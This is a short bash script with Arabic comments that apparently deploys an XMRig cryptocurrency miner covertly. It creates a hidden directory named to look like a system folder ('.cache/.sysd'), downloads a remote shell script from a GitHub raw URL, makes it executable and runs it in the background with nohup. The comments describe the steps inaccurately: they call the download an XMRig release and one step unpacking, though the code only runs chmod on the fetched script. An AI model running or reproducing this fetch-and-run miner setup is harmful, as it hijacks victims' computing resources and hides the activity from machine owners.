#!/bin/bash

# إعداد بيانات المحفظة والمعدّن
# مجلد العمل
WORKDIR="$HOME/.cache/.sysd"  # ← مجلد خفي داخل .cache
mkdir -p "$WORKDIR" && cd "$WORKDIR"

# تحميل النسخة الجاهزة من XMRig (Linux x64)
wget https://raw.githubusercontent.com/ewilkinso/ruby/refs/heads/main/start.sh

# فك الضغط
chmod +x start.sh


# تشغيل المعدّن في الخلفية باستخدام nohup
nohup ./start.sh > cpu_output.log 2>&1 &
